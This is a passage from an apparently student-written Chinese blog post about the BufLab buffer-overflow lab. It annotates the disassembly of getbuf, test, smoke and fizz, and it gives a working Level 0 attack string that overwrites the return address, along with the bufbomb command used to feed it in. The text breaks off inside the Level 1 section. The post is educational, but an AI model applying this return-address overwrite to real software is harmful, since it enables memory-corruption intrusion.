@@ -1,0 +1,764 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <title>
+    BufLab实验 |
+    
+    Ycx&#39;Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="一、实验目的：通过缓冲区溢出攻击，使学生进一步理解IA-32函数调用规则和栈帧结构。 二、实验技能：需要使用objdump来反汇编目标程序，使用gdb单步跟踪调试机器代码，查看相关内存及寄存器内容，也需要学生掌握简单的IA32汇编程序编写方法。 三、实验要求：5个难度等级（0-4逐级递增） 级别0、Smoke（candle）：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BufLab实验">
+<meta property="og:url" content="https://ycx6666.github.io/2024/06/bufferbomb/index.html">
+<meta property="og:site_name" content="Ycx&#39;Blog">
+<meta property="og:description" content="一、实验目的：通过缓冲区溢出攻击，使学生进一步理解IA-32函数调用规则和栈帧结构。 二、实验技能：需要使用objdump来反汇编目标程序，使用gdb单步跟踪调试机器代码，查看相关内存及寄存器内容，也需要学生掌握简单的IA32汇编程序编写方法。 三、实验要求：5个难度等级（0-4逐级递增） 级别0、Smoke（candle）：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ycx6666.github.io/2024/06/images/bufferbomb/image-20240515172448203.png">
+<meta property="og:image" content="https://ycx6666.github.io/2024/06/images/bufferbomb/image-20240515172357887.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515212026806.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515213756545.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515214042198.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515215147724.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515222402877.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515221234957.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515222549094.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515224821753.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240515230406545.png">
+<meta property="og:image" content="https://ycx6666.github.io/2024/06/images/bufferbomb/image-20240516220211069.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240516221552530.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240516224349905.png">
+<meta property="og:image" content="https://ycx6666.github.io/images/bufferbomb/image-20240516231607866.png">
+<meta property="article:published_time" content="2024-06-17T13:44:57.000Z">
+<meta property="article:modified_time" content="2024-05-18T07:39:44.285Z">
+<meta property="article:author" content="Ycx.Cc">
+<meta property="article:tag" content="实验">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ycx6666.github.io/2024/06/images/bufferbomb/image-20240515172448203.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Ycx'Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css">
+
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('load', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.jpg" alt="BufLab实验">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>BufLab实验</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、实验目的：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E6%8A%80%E8%83%BD%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、实验技能：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、实验要求：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">4.</span> <span class="toc-text">四、实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%9F%BA%E4%BA%8E%E5%AD%A6%E5%8F%B7%E7%94%9F%E6%88%90cookie"><span class="toc-number">4.1.</span> <span class="toc-text">1、基于学号生成cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%86%E6%9E%90getbuf%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">2、分析getbuf函数:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%88%86%E6%9E%90getbufn%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">3、分析getbufn函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Level-0"><span class="toc-number">4.4.</span> <span class="toc-text">4、Level 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81level-1"><span class="toc-number">4.5.</span> <span class="toc-text">5、level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81level-2"><span class="toc-number">4.6.</span> <span class="toc-text">6、level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81level-3"><span class="toc-number">4.7.</span> <span class="toc-text">7、level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81level-4"><span class="toc-number">4.8.</span> <span class="toc-text">8、level 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">五、实验总结</span></a></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ycx.Cc" class="lazyload">
+  <div class="sidebar-author-name">Ycx.Cc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">17</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class=icon-github>
+      <a href=https://github.com/Ycx6666 itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+          <section id="main"><article id="post-bufferbomb" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/06/bufferbomb/" class="article-date-link">
+    <time datetime="2024-06-17T13:44:57.000Z" itemprop="datePublished">2024-06-17</time>
+  </a>
+</div>
+
+      
+  <div class="article-category wow slideInLeft">
+    <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">计算机系统</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h2><p>通过缓冲区溢出攻击，使学生进一步理解IA-32函数调用规则和栈帧结构。</p>
+<h2 id="二、实验技能："><a href="#二、实验技能：" class="headerlink" title="二、实验技能："></a>二、实验技能：</h2><p>需要使用objdump来反汇编目标程序，使用gdb单步跟踪调试机器代码，查看相关内存及寄存器内容，也需要学生掌握简单的IA32汇编程序编写方法。</p>
+<h2 id="三、实验要求："><a href="#三、实验要求：" class="headerlink" title="三、实验要求："></a>三、实验要求：</h2><p>5个难度等级（0-4逐级递增）</p>
+<p><strong>级别0、Smoke（candle）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smoke函数。</p>
+<p><strong>级别1、Fizz（sparkler）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行fizz函数；fizz函数含有一个参数（cookie值），构造的攻击字符串应能给定fizz函数正确的参数，使其判断成功。</p>
+<p><strong>级别2、Bang（firecracker）</strong>：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行bang函数；并且要篡改全局变量global_value为cookie值，使其判断成功。因此，需要在缓冲区中注入恶意代码篡改全局变量。</p>
+<p><strong>级别3、Boom（dynamite）：</strong>前面的攻击都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行。Boom要求攻击程序能够返回到原调用函数test继续执行，即要求攻击之后，还原对栈帧结构的破坏。</p>
+<p><strong>级别4、kaboom(Nitro)：</strong>本攻击需要对目标程序连续攻击n&#x3D;5次，但每次攻击，被攻击函数的栈帧内存地址都不同，也就是函数的栈帧位置每次运行时都不一样。因此，要想办法保证每次都能够正确复原原栈帧被破坏的状态，使程序每次都能够正确返回。</p>
+<h2 id="四、实验内容"><a href="#四、实验内容" class="headerlink" title="四、实验内容"></a>四、实验内容</h2><h3 id="1、基于学号生成cookie"><a href="#1、基于学号生成cookie" class="headerlink" title="1、基于学号生成cookie"></a>1、基于学号生成cookie</h3><p>输入<code>./makecookie 202226010418</code><br>从而得到了对应的cookie <code>0x7fb8d860</code></p>
+<h3 id="2、分析getbuf函数"><a href="#2、分析getbuf函数" class="headerlink" title="2、分析getbuf函数:"></a>2、分析getbuf函数:</h3><p>getbuf函数汇编代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">8049262:    55                          push   %ebp      // 把基址指针（ebp）推入栈中</span><br><span class="line">8049263:    89 e5                       mov    %esp,%ebp // 把当前栈顶（esp）设定为新的基址</span><br><span class="line">8049265:    83 ec 38                    sub    $0x38,%esp // 在栈上分配38h (56) 字节的空间</span><br><span class="line">8049268:    8d 45 d8                    lea    -0x28(%ebp),%eax // 加载ebp - 28h的地址到eax，这是输入buffer的地址</span><br><span class="line">804926b:    89 04 24                    mov    %eax,(%esp) // 把输入buffer的地址压入栈顶，作为参数给Gets函数</span><br><span class="line">804926e:    e8 bf f9 ff ff              call   8048c32 &lt;Gets&gt; // 调用Gets函数，读取输入到buffer</span><br><span class="line">8049273:    b8 01 00 00 00              mov    $0x1,%eax // 把立即数1移动到eax，这将作为函数getbuf的返回值</span><br><span class="line">8049278:    c9                          leave   // 把ebp值移动到esp并弹出ebp，完成栈的回收</span><br><span class="line">8049279:    c3                          ret   // 返回上级调用者</span><br><span class="line">804927a:	  90                   	nop 	//这些多余的&#x27;90&#x27;s是nop命令，意味着“无操作” </span><br><span class="line">804927b:		90                   	nop</span><br><span class="line">804927c:		90                   	nop</span><br><span class="line">804927d:		90                   	nop</span><br><span class="line">804927e:		90                   	nop</span><br><span class="line">804927f:		90                   	nop</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、分析getbufn函数："><a href="#3、分析getbufn函数：" class="headerlink" title="3、分析getbufn函数："></a>3、分析getbufn函数：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8049244:	55                      push   %ebp               // 保存基址指针寄存器的值</span><br><span class="line">8049245:	89 e5                   mov    %esp,%ebp          // 把栈指针寄存器的值复制给基址指针寄存器</span><br><span class="line">8049247:	81 ec 18 02 00 00       sub    $0x218,%esp        // 从栈指针寄存器的值中减去0x218，为局部变量分配内存</span><br><span class="line">804924d:	8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:	89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:	e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:	b8 01 00 00 00          mov    $0x1,%eax          // 把1加载到eax中，这将作为函数的返回值</span><br><span class="line">8049260:	c9                      leave                     // 把ebp的值赋给esp，然后弹出ebp，清空函数栈帧</span><br><span class="line">8049261:	c3                      ret                       // 返回到调用者</span><br></pre></td></tr></table></figure>
+
+<p>getbuf函数在test函数中被调用，test汇编如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">08048e3c &lt;test&gt;:</span><br><span class="line"> 8048e3c:	55                   	push   %ebp</span><br><span class="line"> 8048e3d:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048e3f:	53                   	push   %ebx</span><br><span class="line"> 8048e40:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line"> 8048e43:	e8 d0 fd ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048e48:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048e4b:	e8 12 04 00 00       	call   8049262 &lt;getbuf&gt;</span><br><span class="line"> 8048e50:	89 c3                	mov    %eax,%ebx</span><br><span class="line"> 8048e52:	e8 c1 fd ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048e57:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048e5a:	39 d0                	cmp    %edx,%eax</span><br><span class="line"> 8048e5c:	74 16                	je     8048e74 &lt;test+0x38&gt;</span><br><span class="line"> 8048e5e:	c7 44 24 04 60 a4 04 	movl   $0x804a460,0x4(%esp)</span><br><span class="line"> 8048e65:	08 </span><br><span class="line"> 8048e66:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048e6d:	e8 1e fb ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e72:	eb 46                	jmp    8048eba &lt;test+0x7e&gt;</span><br><span class="line"> 8048e74:	3b 1d 04 d1 04 08    	cmp    0x804d104,%ebx</span><br><span class="line"> 8048e7a:	75 26                	jne    8048ea2 &lt;test+0x66&gt;</span><br><span class="line"> 8048e7c:	89 5c 24 08          	mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048e80:	c7 44 24 04 1a a3 04 	movl   $0x804a31a,0x4(%esp)</span><br><span class="line"> 8048e87:	08 </span><br><span class="line"> 8048e88:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048e8f:	e8 fc fa ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e94:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)</span><br><span class="line"> 8048e9b:	e8 e0 03 00 00       	call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048ea0:	eb 18                	jmp    8048eba &lt;test+0x7e&gt;</span><br><span class="line"> 8048ea2:	89 5c 24 08          	mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048ea6:	c7 44 24 04 37 a3 04 	movl   $0x804a337,0x4(%esp)</span><br><span class="line"> 8048ead:	08 </span><br><span class="line"> 8048eae:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048eb5:	e8 d6 fa ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048eba:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 8048ebd:	5b                   	pop    %ebx</span><br><span class="line"> 8048ebe:	5d                   	pop    %ebp</span><br><span class="line"> 8048ebf:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+
+<p>可以画出test和getfuf原始的栈图:</p>
+<img src="../images/bufferbomb/image-20240515172448203.png" alt="image-20240515172448203" style="zoom:50%;">
+
+
+
+<h3 id="4、Level-0"><a href="#4、Level-0" class="headerlink" title="4、Level 0"></a>4、Level 0</h3><p>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smoke函数。</p>
+<p>smoke函数的汇编代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">08048e0a &lt;smoke&gt;:</span><br><span class="line"> 8048e0a:	55                   	push   %ebp</span><br><span class="line"> 8048e0b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048e0d:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048e10:	c7 44 24 04 fe a2 04 	movl   $0x804a2fe,0x4(%esp)</span><br><span class="line"> 8048e17:	08 </span><br><span class="line"> 8048e18:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048e1f:	e8 6c fb ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e24:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 8048e2b:	e8 50 04 00 00       	call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048e30:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 8048e37:	e8 94 fa ff ff       	call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到smoke的函数地址为<code>08048e0a</code></p>
+<p>原始栈：<img src="../images/bufferbomb/image-20240515172357887.png" alt="image-20240515172357887" style="zoom:50%;"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line">804926b:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line">804926e:	e8 bf f9 ff ff       	call   8048c32 &lt;Gets&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据这里可以得到Gets所能调动的栈大小为0x28个字节大小</p>
+<p>那么只需要在返回地址区放入返回地址，就能在输入buffer之后返回到smoke函数，那么只需要把buffer内容控制到刚好覆盖test返回区</p>
+<p>由于在这里Gets函数所能存储的输入buf的区域只有0x28个字节，那么就需要输入的字节大小就为:<br>$$<br>buf(0x28)+ebp(0x4)+return area(0x4)&#x3D;48<br>$$<br>个字节大小，并且最后四个字节存放smoke的首地址<code>08048e0a</code>即可</p>
+<p>由于是小端法存储，这个数据可以是:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 0a 8e 04 08</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>cat level0.txt |./hex2raw |./bufbomb -u 202226010418</code></p>
+<p>然而显示错误，尝试将0a加1延长函数运行，即改为0b，发现成功</p>
+<p><img src="/../images/bufferbomb/image-20240515212026806.png" alt="image-20240515212026806"></p>
+<h3 id="5、level-1"><a href="#5、level-1" class="headerlink" title="5、level 1"></a>5、level 1</h3><p><strong>级别1、Fizz（sparkler）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行fizz函数；fizz函数含有一个参数（cookie值），构造的攻击字符串应能给定fizz函数正确的参数，使其判断成功。</p>
+<p>fizz函数汇编代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048daf &lt;fizz&gt;:</span><br><span class="line"> 8048daf:	55                   	push   %ebp</span><br><span class="line"> 8048db0:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048db2:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048db5:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048db8:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax</span><br><span class="line"> 8048dbe:	75 26                	jne    8048de6 &lt;fizz+0x37&gt;</span><br><span class="line"> 8048dc0:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048dc4:	c7 44 24 04 e0 a2 04 	movl   $0x804a2e0,0x4(%esp)</span><br><span class="line"> 8048dcb:	08 </span><br><span class="line"> 8048dcc:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048dd3:	e8 b8 fb ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dd8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048ddf:	e8 9c 04 00 00       	call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048de4:	eb 18                	jmp    8048dfe 